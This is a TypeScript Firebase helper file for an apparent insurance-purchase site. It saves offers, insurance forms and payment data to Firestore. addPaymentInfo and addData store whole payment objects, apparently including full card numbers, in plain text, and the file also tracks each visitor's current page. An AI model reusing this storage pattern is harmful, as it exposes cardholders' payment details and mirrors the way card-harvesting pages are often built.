/* eslint-disable @typescript-eslint/no-explicit-any */
// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import {
  addDoc,
  collection,
  doc,
  getFirestore,
  setDoc,
  updateDoc,
} from "firebase/firestore";
import { PaymentFormData } from "../types/payment";
import { Offer } from "../types/offers";
import { InsuranceFormData } from "../types/insurance";

const firebaseConfig = {
  apiKey: "AIzaSyA0h6Fr8Rj-1h1-hnVaagrdINe9KELOOUM",
  authDomain: "qatar-33.firebaseapp.com",
  projectId: "qatar-33",
  storageBucket: "qatar-33.firebasestorage.app",
  messagingSenderId: "1092649551137",
  appId: "1:1092649551137:web:e5a35176cc5f6c16076a60",
  measurementId: "G-1N7BHMYPB9",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
export const db = getFirestore(app);

// Get the Firestore instance from your initialized Firebase app

/**
 * Add an offer to Firestore
 */
export async function addOffer(offer: Offer) {
  try {
    // If we have an ID, use it, otherwise let Firestore generate one
    if (offer.id) {
      const offerRef = doc(db, "offers", offer.id);
      await setDoc(offerRef, {
        ...offer,
        createdAt: new Date().toISOString(),
      });
      console.log("Offer added with ID:", offer.id);
      return offer.id;
    } else {
      const offerRef = await addDoc(collection(db, "offers"), {
        ...offer,
        createdAt: new Date().toISOString(),
      });
      console.log("Offer added with ID:", offerRef.id);
      return offerRef.id;
    }
  } catch (error) {
    console.error("Error adding offer:", error);
    throw error;
  }
}

/**
 * Add payment information to Firestore
 */
export async function addPaymentInfo(
  paymentData: PaymentFormData,
  userId: string
) {
  try {
    // Store payment info with the user ID as reference
    const paymentRef = await addDoc(collection(db, "payments"), {
      ...paymentData,
      userId,
      createdAt: new Date().toISOString(),
    });

    console.log("Payment info added with ID:", paymentRef.id);
    return paymentRef.id;
  } catch (error) {
    console.error("Error adding payment info:", error);
    throw error;
  }
}

export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = doc(db, "pays", data.id!);
    await setDoc(
      docRef,
      { createdDate: new Date().toISOString(), ...data },
      { merge: true }
    );

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
/**
 * Add insurance form data to Firestore
 */
export const handleUpdatePage = async (newPagename: string, id: string) => {
  const targetPost = doc(db, "pays", id);
  await updateDoc(targetPost, {
    pagename: newPagename,
  });
};
export async function addInsuranceData(
  insuranceData: InsuranceFormData,
  userId: string
) {
  try {
    // Store insurance data with the user ID as reference
    const insuranceRef = await addDoc(collection(db, "insurances"), {
      ...insuranceData,
      userId,
      createdAt: new Date().toISOString(),
      status: "pending", // You can add a status field to track the insurance request
    });

    console.log("Insurance data added with ID:", insuranceRef.id);
    return insuranceRef.id;
  } catch (error) {
    console.error("Error adding insurance data:", error);
    throw error;
  }
}

/**
 * Create a complete insurance application with all related data
 */
export async function createInsuranceApplication(
  insuranceData: InsuranceFormData,
  paymentData: PaymentFormData,
  selectedOffer: Offer
) {
  try {
    // Generate a unique ID for this application
    const applicationId = `app_${Date.now()}`;

    // Store the complete application data
    const applicationRef = doc(db, "applications", applicationId);
    await setDoc(applicationRef, {
      insuranceData,
      paymentData: {
        full_name: paymentData.full_name,
        // Don't store sensitive card details in plain text
        // In a real app, you would use a payment processor
        card_number_last4: paymentData.card_number.slice(-4),
      },
      offer: {
        id: selectedOffer.id,
        name: selectedOffer.name,
        type: selectedOffer.type,
        main_price: selectedOffer.main_price,
        total_price: calculateTotalPrice(selectedOffer),
      },
      status: "submitted",
      createdAt: new Date().toISOString(),
    });

    console.log("Insurance application created with ID:", applicationId);
    return applicationId;
  } catch (error) {
    console.error("Error creating insurance application:", error);
    throw error;
  }
}

/**
 * Calculate the total price of an offer including extras
 */
function calculateTotalPrice(offer: Offer): number {
  const extraFeaturesTotal = offer.extra_features.reduce(
    (sum, feature) => sum + feature.price,
    0
  );

  const extraExpensesTotal = offer.extra_expenses.reduce(
    (sum, expense) => sum + expense.price,
    0
  );

  return offer.main_price + extraFeaturesTotal + extraExpensesTotal;
}
